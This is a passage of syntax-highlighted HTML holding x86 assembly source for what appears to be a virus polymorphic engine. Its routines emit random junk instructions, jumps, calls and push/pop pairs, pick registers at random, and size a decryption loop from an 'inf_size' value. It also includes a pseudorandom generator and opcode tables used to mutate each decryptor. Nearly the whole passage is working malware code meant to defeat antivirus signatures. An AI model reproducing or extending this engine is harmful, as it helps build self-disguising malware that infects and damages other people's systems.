                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_math_work</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">00000002h</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">a_math8</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_math_work</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_math_imm</span><span class="sc4">-</span><span class="sc5">tbl_math_imm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">tbl_math_imm</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate push reg + garbage + pop reg</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_push_g_pop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Note that garbage generator can call itself in a</span><span class="sc0">
                </span><span class="sc1">;recursive way, so structures like the following</span><span class="sc0">
                </span><span class="sc1">;example can be produced</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;       push reg_1</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       push reg_2</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       pop reg_2</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       pop reg_1</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate CALL without return</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_call_cont</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate unconditional jumps</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_jump_u</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate conditional jumps</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_jump_c</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate one byte garbage code that does not change reg values</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_save_code</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_save_code</span><span class="sc4">-</span><span class="sc5">tbl_save_code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_save_code</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get a ramdom reg</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">get_rnd_reg</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000007h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get a ramdom reg (avoid REG_READ_ONLY, REG_IS_COUNTER and REG_IS_INDEX)</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">get_valid_reg</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">REG_IS_INDEX</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">REG_IS_COUNTER</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">REG_READ_ONLY</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Load ecx with crypt_size / oper_size</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">fixed_size2ecx</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">inf_size</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_2ecx</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ok_2ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ok_2ecx</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate a block of random data</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_rnd_block</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Get number of bytes to fill</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000010h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">rnd_fill</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Fill a ecx block with random data</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">rnd_fill_loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">              
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">rnd_fill_loop</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Linear congruent pseudorandom number generator</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">get_rnd32</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7FFFFFFFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Returns a random num between 0 and entry eax</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">get_rnd_range</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">  
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Poly engine initialized data</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Register table</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; - Register mask</span><span class="sc0">
                </span><span class="sc1">; - Register flags</span><span class="sc0">

</span><span class="sc5">tbl_regs</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">      </span><span class="sc1">;eax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000011b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                </span><span class="sc1">;ebx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                </span><span class="sc1">;ecx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                </span><span class="sc1">;edx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000110b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">        </span><span class="sc1">;esi</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">        </span><span class="sc1">;edi</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000101b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">        </span><span class="sc1">;ebp</span><span class="sc0">

</span><span class="sc5">end_regs</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc1">;Aliases for reg table structure</span><span class="sc0">

</span><span class="sc5">REG_MASK</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">REG_FLAGS</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

                </span><span class="sc1">;Bit aliases for reg flags</span><span class="sc0">

</span><span class="sc5">REG_IS_INDEX</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">;Register used as main index register</span><span class="sc0">
</span><span class="sc5">REG_IS_COUNTER</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">;This register is used as loop counter</span><span class="sc0">
</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">         </span><span class="sc1">;Never modify the value of this register</span><span class="sc0">
</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">         </span><span class="sc1">;ESI EDI and EBP havent 8bit version</span><span class="sc0">

                </span><span class="sc1">;Initial reg flags</span><span class="sc0">

</span><span class="sc5">tbl_startup</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">REG_READ_ONLY</span><span class="sc0">        </span><span class="sc1">;eax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">;ebx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">;ecx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">;edx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">REG_NO_8BIT</span><span class="sc0">          </span><span class="sc1">;esi</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">REG_NO_8BIT</span><span class="sc0">          </span><span class="sc1">;edi</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">REG_NO_8BIT</span><span class="sc0">          </span><span class="sc1">;ebp</span><span class="sc0">

                </span><span class="sc1">;Code that does not disturb reg values</span><span class="sc0">
        
</span><span class="sc5">tbl_save_code</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">cmc</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">std</span><span class="sc0">
                
</span><span class="sc5">end_save_code</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc1">;Generators for [reg] indexing mode</span><span class="sc0">

</span><span class="sc5">tbl_idx_reg</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_inc_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_dec_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_not_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_add_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_sub_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_xor_reg</span><span class="sc0">

                </span><span class="sc1">;Generators for [reg+imm] indexing mode</span><span class="sc0">

</span><span class="sc5">tbl_dis_reg</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_inc_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_dec_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_not_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_add_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_sub_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_xor_reg</span><span class="sc0">

                </span><span class="sc1">;Generators for [reg+reg] indexing mode</span><span class="sc0">

</span><span class="sc5">tbl_xtended</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_inc_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_dec_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_not_reg</span><span class="sc0">
